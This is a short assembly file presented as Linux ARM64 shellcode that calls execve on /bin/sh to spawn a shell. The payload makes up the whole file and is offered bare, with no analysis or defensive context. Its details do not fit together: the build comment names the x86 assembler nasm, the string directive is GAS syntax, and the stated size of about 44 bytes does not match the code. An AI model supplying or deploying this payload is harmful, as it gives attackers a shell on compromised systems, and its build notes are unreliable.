; Linux ARM64 execve /bin/sh shellcode
; nasm -f elf64 execve_sh.asm -o execve_sh.o
; Size: ~44 bytes

section .text
global _start
_start:
    ; execve("/bin/sh", NULL, NULL)
    mov     x8, #221            ; __NR_execve
    adr     x0, binsh           ; pathname
    mov     x1, xzr             ; argv = NULL
    mov     x2, xzr             ; envp = NULL
    svc     #0
binsh: .ascii "/bin/sh\0"
